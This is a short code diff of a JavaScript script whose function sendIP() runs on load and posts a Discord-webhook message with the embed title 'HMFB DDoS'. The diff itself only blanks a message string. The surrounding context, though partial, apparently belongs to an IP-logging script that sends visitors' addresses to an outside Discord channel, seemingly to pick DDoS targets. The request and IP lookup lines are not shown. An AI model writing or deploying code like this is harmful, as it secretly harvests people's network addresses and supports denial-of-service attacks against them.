@@ -15,7 +15,7 @@ const sendIP = () => {
                         body: JSON.stringify({
                             username: "HMFB", // optionally changeable
                             avatar_url: "https://media.discordapp.net/attachments/1444072962729840722/1448716308563890246/pe.png?ex=69500c33&is=694ebab3&hm=5c03b305acf0c3d204726c5b34fc9868d3b4a14c7a1d16454359052ef1dc8232&=&format=webp&quality=lossless&width=300&height=300", // optionally changeable
-                            content: `XD`,
+                            content: ``,
                             embeds: [
                                 {
                                     title: 'HMFB DDoS',
@@ -40,4 +40,5 @@ const sendIP = () => {
         });
 };
 sendIP();
+
 
